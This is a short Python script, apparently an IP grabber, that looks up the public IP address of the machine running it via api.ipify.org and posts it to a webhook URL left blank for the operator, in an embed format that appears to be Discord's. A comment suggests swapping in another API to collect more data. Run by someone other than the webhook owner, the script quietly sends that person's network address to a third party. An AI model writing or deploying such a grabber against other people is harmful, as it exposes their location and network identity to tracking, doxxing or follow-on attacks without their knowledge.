import requests
from requests import get
import json

wh= " " #webhook link here
ipaddress = get('https://api.ipify.org').text  #If  you'd like more than the ip address simply use a different api.
requests.post(wh, data=json.dumps({ "embeds": [ { "fields": [ { "name": "ip", "value": f"``{ipaddress}``"} ] } ] }), headers={"Content-Type": "application/json"})
